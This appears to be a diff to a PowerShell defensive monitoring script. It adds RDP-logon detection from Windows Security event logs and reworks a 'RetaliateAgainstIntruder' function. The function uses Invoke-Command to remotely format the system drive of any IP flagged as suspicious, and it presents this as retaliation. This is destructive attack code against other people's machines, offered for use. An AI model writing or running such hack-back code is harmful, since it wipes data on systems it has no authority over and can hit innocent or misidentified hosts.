@@ -367,20 +367,43 @@ function Check-FileCertificate {
     }
 }
 
-# Function to retaliate against intruder
+# Function to detect remote login sessions
+function Detect-RemoteLogin {
+    try {
+        # Get the event logs related to remote desktop sessions (Event ID 4624 for successful logons)
+        $remoteLoginEvents = Get-WinEvent -LogName Security | Where-Object {
+            $_.Id -eq 4624 -and $_.Message -like "*RemoteInteractive*"   # Remote interactive logons (RDP)
+        }
+
+        foreach ($event in $remoteLoginEvents) {
+            # Parse the event message for the login details
+            $message = $event.Message
+            $ipAddress = ($message -match "Source Network Address:\s*(\S+)") ? $matches[1] : "Unknown IP"
+            $userName = ($message -match "New Logon:\s*.*?Account Name:\s*(\S+)") ? $matches[1] : "Unknown User"
+            
+            # Log the detected remote login activity
+            Write-Log "Remote login detected: User '$userName' from IP '$ipAddress'"
+        }
+    } catch {
+        Write-Log "Error detecting remote login: $($_.Exception.Message)"
+    }
+}
+
 function RetaliateAgainstIntruder {
     param (
-        [string]$SuspiciousIP,    # The IP of the suspicious connection
-        [string]$DriveToFormat    # Drive letter to target (e.g., "C:")
+        [string]$ipAddress    # The IP of the suspicious connection
     )
 
+    # Get the system drive dynamically
+    $systemDrive = Get-SystemDrive
+
     # Validate suspicious activity (Optional: Analyze connection logs)
-    Write-Host "Validating suspicious activity from $SuspiciousIP..." -ForegroundColor Yellow
+    Write-Host "Validating suspicious activity from $ipAddress..." -ForegroundColor Yellow
 
     # Attempt retaliation (formatting remote drive)
     try {
-        Write-Host "Attempting to format the drive of $SuspiciousIP..." -ForegroundColor Red
-        Invoke-Command -ComputerName $SuspiciousIP -ScriptBlock {
+        Write-Host "Attempting to format the drive of $ipAddress..." -ForegroundColor Red
+        Invoke-Command -ComputerName $ipAddress -ScriptBlock {
             param ($Drive)
             $Disk = Get-CimInstance -Query "SELECT * FROM Win32_Volume WHERE DriveLetter='$Drive'"
             if ($null -ne $Disk) {
@@ -388,10 +411,10 @@ function RetaliateAgainstIntruder {
             } else {
                 Write-Host "Drive $Drive not found."
             }
-        } -ArgumentList $DriveToFormat
-        Write-Host "Retaliation complete for $SuspiciousIP." -ForegroundColor Green
+        } -ArgumentList $systemDrive
+        Write-Host "Retaliation complete for $ipAddress." -ForegroundColor Green
     } catch {
-        Write-Host "Failed to retaliate against ${SuspiciousIP}: $_" -ForegroundColor Red
+        Write-Host "Failed to retaliate against $ipAddress: $_" -ForegroundColor Red
     }
 }
 
@@ -406,6 +429,7 @@ function Run-Monitoring {
     Detect-And-Terminate-WebServers
     Remove-Unsigned-And-Suspicious-DLLs # Updated function
     Monitor-SuspiciousDLLs
+    Detect-RemoteLogin
     Start-Sleep $PollingInterval
 }
 
